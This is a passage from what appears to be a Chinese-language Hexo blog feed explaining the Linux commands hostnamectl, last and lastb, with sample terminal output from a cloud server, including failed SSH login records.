主机名（常说的主机名）</h4><p>静态主机名称，用于启动时初始化内核主机名，对字符有限制（不可以使用特殊字符# @ 等）</p><p>存储在 &#x2F;etc&#x2F;hostname，从 hostname命令中可查看更多信息</p><h4 id="transient-主机名"><a href="#transient-主机名" class="headerlink" title="transient 主机名"></a>transient 主机名</h4><p>临时主机名称，从网络配置中接收到的临时主机名，如果静态主机名有设置，且不是localhost，就不使用临时主机名，对字符有限制（不可以使用特殊字符# @ 等）</p><p>可以使用systemd-firstboot(1)初始化挂载(但未启动)系统映像的系统主机名。</p><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><h4 id="–no-ask-password"><a href="#–no-ask-password" class="headerlink" title="–no-ask-password"></a>–no-ask-password</h4><p>执行特权操作时不需要密码</p><h4 id="–static-–pretty-–transient"><a href="#–static-–pretty-–transient" class="headerlink" title="–static –pretty –transient"></a>–static –pretty –transient</h4><p>仅显示对应主机名，搭配 status 命令使用，由于 status 是 hostnamectl 默认命令，也可以不写，例如 hostnamectl –static 等价于 hostnamectl –static status</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment">#</span><br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static status</span><br>iZbp1191gh7vw52537lyxrZ<br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>iZbp1191gh7vw52537lyxrZ<br></code></pre></td></tr></table></figure><p>与 set-hostname命令搭配使用，用于修改指定的主机名</p><h4 id="–version"><a href="#–version" class="headerlink" title="–version"></a>–version</h4><p>显示工具版本信息</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># hostnamectl --version</span><br><span class="hljs-params">system</span>d <span class="hljs-number">249</span> (<span class="hljs-number">249.11</span>-<span class="hljs-number">0</span>ubuntu3.<span class="hljs-number">9</span>)<br>+PAM +AUDIT +SELINUX +APPARMOR +IMA +SMACK +SECCOMP +GCRYPT +GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 -IDN +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 -PWQUALITY -P11KIT -QRENCODE +<span class="hljs-literal">BZIP2</span> +LZ4 +XZ +<span class="hljs-literal">ZLIB</span> +ZSTD -XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified<br></code></pre></td></tr></table></figure><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="status"><a href="#status" class="headerlink" title="status"></a>status</h4><p>显示当前主机名和相关信息</p><h4 id="set-hostname-hostname-NAME"><a href="#set-hostname-hostname-NAME" class="headerlink" title="set-hostname&#x2F;hostname NAME"></a>set-hostname&#x2F;hostname NAME</h4><p>修改主机名，默认会修改 pretty static transient 主机名</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl set-hostname aliyun#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br>aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /etc/machine-i</span><br>machine-id    machine-info<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /etc/machine-info</span><br><span class="hljs-title class_">PRETTY_HOSTNAME</span>=aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ls -lat /etc/machine-info</span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">28</span> <span class="hljs-title class_">Jan</span> <span class="hljs-number">30</span> <span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> /etc/machine-info<br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>aliyun<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --transient</span><br>aliyun<br><br><br></code></pre></td></tr></table></figure><p>可以指定只修改某个主机名 hostnamectl –static set-hostname iZbp1191gh7vw52537lyxrZ</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static set-hostname iZbp1191gh7vw52537lyxrZ</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br>aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>iZbp1191gh7vw52537lyxrZ<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --transient</span><br>iZbp1191gh7vw52537lyxrZ<br></code></pre></td></tr></table></figure><h4 id="set-icon-name-icon-name-NAME"><a href="#set-icon-name-icon-name-NAME" class="headerlink" title="set-icon-name&#x2F;icon-name NAME"></a>set-icon-name&#x2F;icon-name NAME</h4><p>设置主机图标名称，图标名称用于一些图形化程序可视化当前主机</p><p>NAME 为空’’的时候，会重置为默认值</p><p>一般都是 computer-vm</p><h4 id="set-chassis-chassis-TYPE"><a href="#set-chassis-chassis-TYPE" class="headerlink" title="set-chassis&#x2F;chassis TYPE"></a>set-chassis&#x2F;chassis TYPE</h4><p>设置主机类型，主机类型用于一些图形化程序可视化主机或者修改用户交互</p><p>TYPE  为空’’的时候，会重置为默认值</p><p>TYPE可选参数：</p><p>desktop</p><p>laptop（笔记本）</p><p>server</p><p>tablet（平板电脑）</p><p>handset（手机）</p><p>watch</p><p>embedded</p><p>vm</p><p>container</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs scss">root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl set-chassis watch<br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-attribute">hostname</span>: aliyun#@##@<br>       Icon <span class="hljs-attribute">name</span>: computer-watch<br>         <span class="hljs-attribute">Chassis</span>: watch<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br><br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl set-chassis <span class="hljs-string">&#x27;&#x27;</span><br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-attribute">hostname</span>: aliyun#@##@<br>       Icon <span class="hljs-attribute">name</span>: computer-vm<br>         <span class="hljs-attribute">Chassis</span>: vm<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h4 id="set-deployment-deployment-ENVIRONMENT"><a href="#set-deployment-deployment-ENVIRONMENT" class="headerlink" title="set-deployment&#x2F;deployment ENVIRONMENT"></a>set-deployment&#x2F;deployment ENVIRONMENT</h4><p>设置环境描述</p><p>ENVIRONMENT 不可以包含控制字符</p><p>ENVIRONMENT 建议的值：</p><p>development</p><p>integration</p><p>staging</p><p>production</p><p>ENVIRONMENT  为空’’的时候，会重置为默认值</p><h4 id="set-location-location-LOCATION"><a href="#set-location-location-LOCATION" class="headerlink" title="set-location&#x2F;location LOCATION"></a>set-location&#x2F;location LOCATION</h4><p>设置设备所处位置</p><p>LOCATION 为空’’的时候，会重置为默认值</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>last-lastb</title>
    <link href="/2024/03/15/yunwei/commands/last&amp;lastb/"/>
    <url>/2024/03/15/yunwei/commands/last&amp;lastb/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="last"><a href="#last" class="headerlink" title="last"></a>last</h1><p>last命令会读取用户登录日志内容展示出来，默认&#x2F;var&#x2F;log&#x2F;wtmp，也可以通过 -f 来指定文件</p><h2 id="参数描述"><a href="#参数描述" class="headerlink" title="参数描述"></a>参数描述</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>last [-R] [-num] [ -n num ] [-adFiowx] [ -f file ] [ -t YYYYMMDDHHMMSS ] [name…]  [tty…]</p><p>-f file:指定读取的文件，默认为&#x2F;var&#x2F;log&#x2F;wtmp</p><p>-num</p><p>-n num :显示多少行的数据</p><p>-R:禁止显示主机名</p><p>-a:最后一列显示源主机名</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># last -n 10 -a</span><br>root     pts/<span class="hljs-number">1</span>        Tue Nov <span class="hljs-number">16</span> <span class="hljs-number">20</span>:<span class="hljs-number">23</span>   still logged <span class="hljs-keyword">in</span>    <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>-d:最后一列替换为源主机IP</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># last -n 10 -a -d</span><br>root     pts/<span class="hljs-number">1</span>        Tue Nov <span class="hljs-number">16</span> <span class="hljs-number">20</span>:<span class="hljs-number">23</span>   still logged <span class="hljs-keyword">in</span>    <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>-F:登录时间，推出时间完整展示</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@110 log]<span class="hljs-comment"># last -n 10 -a -d -F</span><br>root     pts/1        Tue Nov<span class="hljs-number"> 16 </span>20:23:07<span class="hljs-number"> 2021 </span>  still logged in                       1.1.1.1<br>root     pts/0        Tue Nov<span class="hljs-number"> 16 </span>09:35:43<span class="hljs-number"> 2021 </span>  still logged in                       1.1.1.1<br>root     pts/0        Mon Nov<span class="hljs-number"> 15 </span>16:16:36<span class="hljs-number"> 2021 </span>- Mon Nov<span class="hljs-number"> 15 </span>19:30:01<span class="hljs-number"> 2021 </span> (03:13)     1.1.1.1<br>reboot   system boot  Tue Nov<span class="hljs-number"> 16 </span>00:14:47<span class="hljs-number"> 2021 </span>- Tue Nov<span class="hljs-number"> 16 </span>20:50:34<span class="hljs-number"> 2021 </span> (20:35)     0.0.0.0<br>root     pts/1        Mon Nov<span class="hljs-number"> 15 </span>15:38:35<span class="hljs-number"> 2021 </span>- down                      (00:36)     1.1.1.1<br>root     pts/0        Mon Nov<span class="hljs-number"> 15 </span>15:08:20<span class="hljs-number"> 2021 </span>- down                      (01:06)     1.1.1.1<br>root     pts/1        Thu Nov<span class="hljs-number"> 11 </span>20:55:21<span class="hljs-number"> 2021 </span>- Thu Nov<span class="hljs-number"> 11 </span>23:11:33<span class="hljs-number"> 2021 </span> (02:16)     1.1.1.1<br></code></pre></td></tr></table></figure><p>命令读取的文件：</p><p>&#x2F;var&#x2F;log&#x2F;wtmp</p><p>该文件为二进制文件，无法直接用cat查看</p><h2 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>lastb命令和last命令类似，默认&#x2F;var&#x2F;log&#x2F;btmp，会显示所有登录记录（成功+失败）</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>lastb [-R] [-num] [ -n num ] [ -f file ] [-adFiowx] [name…]  [tty…]</p><h4 id="lastb-1"><a href="#lastb-1" class="headerlink" title="lastb"></a>lastb</h4><p>显示登录失败的用户信息</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ log]# lastb | more<br>         ssh:notty    175.24.152.224   Thu Aug 25 04:36 - 04:36  (00:00)<br>git      ssh:notty    60.171.76.133    Thu Aug 25 02:59 - 02:59  (00:00)<br>git      ssh:notty    60.171.76.133    Thu Aug 25 02:59 - 02:59  (00:00)<br>psxtg    ssh:notty    192.46.210.172   Wed Aug 24 19:23 - 19:23  (00:00)<br>scdva    ssh:notty    195.96.137.7     Wed Aug 24 17:40 - 17:40  (00:00)<br>         ssh:notty    110.42.200.114   Wed Aug 24 15:14 - 15:14  (00:00)<br>         ssh:notty    175.24.152.224   Wed Aug 24 11:30 - 11:30  (00:00)<br>         ssh:notty    110.42.200.114   Tue Aug 23 18:12 - 18:12  (00:00)<br>root     ssh:notty    201.213.185.243  Tue Aug 23 04:32 - 04:32  (00:00)<br>         ssh:notty    42.194.144.103   Tue Aug 23 00:07 - 00:07  (00:00)<br>username ssh:notty    183.136.225.14   Mon Aug 22 22:53 - 22:53  (00:00)<br>         ssh:notty    65.49.20.68      Mon Aug 22 15:54 - 15:54  (00:00)<br>         ssh:notty    110.42.200.114   Mon Aug 22 13:18 - 13:18  (00:00)<br>test1    pts/2        Thu Aug 18 23:53 - 23:53  (00:00)<br>         ssh:notty    Thu Aug 18 23:38 - 23:38  (00:00)<br><span class="hljs-keyword">test     </span>pts/3        Thu Aug 18 23:24 - 23:24  (00:00)<br><span class="hljs-keyword">test     </span>pts/1        Thu Aug 18 23:11 - 23:11  (00:00)<br>...<br>btmp begins Mon Aug  1 18:23:34 2022<br></code></pre></td></tr></table></figure><h4 id="lastb-d-将IP转换为主机名显示"><a href="#lastb-d-将IP转换为主机名显示" class="headerlink" title="lastb -d 将IP转换为主机名显示"></a>lastb -d 将IP转换为主机名显示</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span>#  <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-d</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">192</span><span class="hljs-selector-tag">-46-210-172</span><span class="hljs-selector-class">.i</span> <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">195.96</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.7</span>     <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">15</span>:<span class="hljs-number">14</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">15</span>:<span class="hljs-number">14</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">18</span>:<span class="hljs-number">12</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">18</span>:<span class="hljs-number">12</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">201.213</span><span class="hljs-selector-class">.185</span><span class="hljs-selector-class">.243</span>. <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">42.194</span><span class="hljs-selector-class">.144</span><span class="hljs-selector-class">.103</span>   <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">00</span>:<span class="hljs-number">07</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">00</span>:<span class="hljs-number">07</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">username</span> <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">183.136</span><span class="hljs-selector-class">.225</span><span class="hljs-selector-class">.14</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">22</span>:<span class="hljs-number">53</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">22</span>:<span class="hljs-number">53</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">scan-19</span><span class="hljs-selector-class">.shadowse</span> <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">15</span>:<span class="hljs-number">54</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">15</span>:<span class="hljs-number">54</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">13</span>:<span class="hljs-number">18</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">13</span>:<span class="hljs-number">18</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-f-filename-读取指定文件记录"><a href="#lastb-f-filename-读取指定文件记录" class="headerlink" title="lastb -f filename 读取指定文件记录"></a>lastb -f filename 读取指定文件记录</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># lastb -f btmp-20220801</span><br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">65</span>.<span class="hljs-number">49</span>.<span class="hljs-number">20</span>.<span class="hljs-number">68</span>      Sat <span class="hljs-keyword">Jul </span><span class="hljs-number">30</span> <span class="hljs-number">09</span>:<span class="hljs-number">47</span> - <span class="hljs-number">09</span>:<span class="hljs-number">47</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-keyword">jvipu </span>   ssh:notty    <span class="hljs-number">45</span>.<span class="hljs-number">33</span>.<span class="hljs-number">65</span>.<span class="hljs-number">249</span>     Fri <span class="hljs-keyword">Jul </span><span class="hljs-number">29</span> <span class="hljs-number">08</span>:<span class="hljs-number">25</span> - <span class="hljs-number">08</span>:<span class="hljs-number">25</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">178</span>.<span class="hljs-number">73</span>.<span class="hljs-number">215</span>.<span class="hljs-number">171</span>   Fri <span class="hljs-keyword">Jul </span><span class="hljs-number">29</span> <span class="hljs-number">06</span>:<span class="hljs-number">11</span> - <span class="hljs-number">06</span>:<span class="hljs-number">11</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">64</span>.<span class="hljs-number">62</span>.<span class="hljs-number">197</span>.<span class="hljs-number">227</span>    Wed <span class="hljs-keyword">Jul </span><span class="hljs-number">27</span> <span class="hljs-number">11</span>:<span class="hljs-number">52</span> - <span class="hljs-number">11</span>:<span class="hljs-number">52</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">64</span>.<span class="hljs-number">62</span>.<span class="hljs-number">197</span>.<span class="hljs-number">227</span>    Tue <span class="hljs-keyword">Jul </span><span class="hljs-number">26</span> <span class="hljs-number">22</span>:<span class="hljs-number">16</span> - <span class="hljs-number">22</span>:<span class="hljs-number">16</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>root     ssh:notty    <span class="hljs-number">39</span>.<span class="hljs-number">174</span>.<span class="hljs-number">65</span>.<span class="hljs-number">227</span>    Tue <span class="hljs-keyword">Jul </span><span class="hljs-number">26</span> <span class="hljs-number">03</span>:<span class="hljs-number">31</span> - <span class="hljs-number">03</span>:<span class="hljs-number">31</span>  (<span 